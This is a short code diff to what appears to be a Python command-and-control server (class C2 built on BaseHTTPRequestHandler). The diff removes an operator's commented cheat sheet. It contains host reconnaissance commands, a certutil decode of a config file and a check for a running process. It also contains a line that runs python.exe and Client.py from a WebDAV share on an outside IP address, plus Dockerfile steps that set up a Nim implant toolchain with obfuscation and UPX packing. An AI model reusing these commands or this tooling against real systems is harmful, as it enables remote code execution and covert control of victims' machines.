@@ -40,27 +40,7 @@ if __name__ == '__main__':
 
 
 
-#Essential CMDs mostly classics, amat. 
-#systeminfo
-#tasklist
-#chcp 65001 & dir “C:\WORK\Source\tgnews\tgnews\bin\x64\Release”
-#nslookup -debug -type=A+AAAA -nosearch <domain> <ip>
-#ipconfig
-#dir
-#chcp 65001 && cmd /c dir
-#certutil -decode C:\Users\Jefry\source\repos\client\client\bin\Release\config.txt
-#C:\Users\Jefry\source\repos\client\client\bin\Release\config1.txt
-#newtime2
-#dir C:\
-#\\194[.]126[.]178[.]8@80\webdav\Python39\python.exe \\194[.]126[.]178[.]8@80\webdav\Python39\Client.py
-#chcp 65001 && cmd /c tasklist /FI “ImageName eq VMSearch.exe”
 
-#FROM nimlang/nim:1.6.18
-
-#RUN apt update \
-#&& apt install -y python3 python3-pip mingw-w64 upx \
-#&& pip3 install prompt_toolkit requests tabulate jsonc-parser pycryptodome \
-#&& nimble install -y nimcrypto crc32 pixie wauto winim rc4 nimprotect
 
 
 class C2(BaseHTTPRequestHandler):
